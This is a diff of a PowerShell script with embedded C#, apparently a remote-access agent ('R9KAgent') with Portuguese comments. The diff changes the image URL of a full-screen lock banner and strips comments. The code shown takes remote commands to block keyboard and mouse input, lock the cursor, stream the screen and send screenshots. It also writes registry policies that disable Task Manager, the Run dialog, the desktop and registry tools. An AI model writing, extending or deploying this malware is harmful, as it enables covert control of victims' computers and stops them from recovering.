@@ -171,13 +171,13 @@ if (-not ("R9KAgent" -as [type])) {
                 if (cmd == "stream_start") { streaming = true; return; }
                 if (cmd == "stream_stop") { streaming = false; lock(writeLock) { myWriter.WriteLine("STREAM_STOPPED"); } return; }
                 
-                // BANNER LOCK (TELA DE BLOQUEIO)
                 if (cmd == "banner_on") {
                     BlockInput(true);
                     bannerThread = new Thread(() => {
                         try {
                             using (var wc = new WebClient()) {
-                                byte[] imgBytes = wc.DownloadData("https://i.imgur.com/NbRDKI1.png");
+                                // IMAGEM ATUALIZADA AQUI
+                                byte[] imgBytes = wc.DownloadData("https://i.imgur.com/gx1MwjP.jpeg");
                                 using (MemoryStream ms = new MemoryStream(imgBytes)) {
                                     Image bgImg = Image.FromStream(ms);
                                     bannerForm = new Form();
@@ -201,7 +201,6 @@ if (-not ("R9KAgent" -as [type])) {
                     return;
                 }
 
-                // DESATIVAR BANNER
                 if (cmd == "banner_off") {
                     BlockInput(false);
                     if (bannerForm != null) {
@@ -231,7 +230,6 @@ if (-not ("R9KAgent" -as [type])) {
 
                 if (cmd == "lock_mouse") { targetX = Cursor.Position.X; targetY = Cursor.Position.Y; isLocked = true; BlockInput(true); lock(writeLock) { myWriter.WriteLine("MOUSE_TRAVADO"); } return; }
                 if (cmd == "unlock_mouse") { isLocked = false; BlockInput(false); lock(writeLock) { myWriter.WriteLine("MOUSE_SOLTO"); } return; }
-
                 if (cmd == "screenshot") { lock(writeLock) { myWriter.WriteLine("SCREEN:" + CaptureScreen(1920, 85)); } return; }
                 if (cmd == "ping") { lock(writeLock) { myWriter.WriteLine("PONG"); } return; }
 
@@ -264,7 +262,6 @@ if (-not ("R9KAgent" -as [type])) {
                 key.SetValue("NoRun", 1, RegistryValueKind.DWord);
                 key.SetValue("NoDesktop", 1, RegistryValueKind.DWord);
             }
-
             using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System")) {
                 key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                 key.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
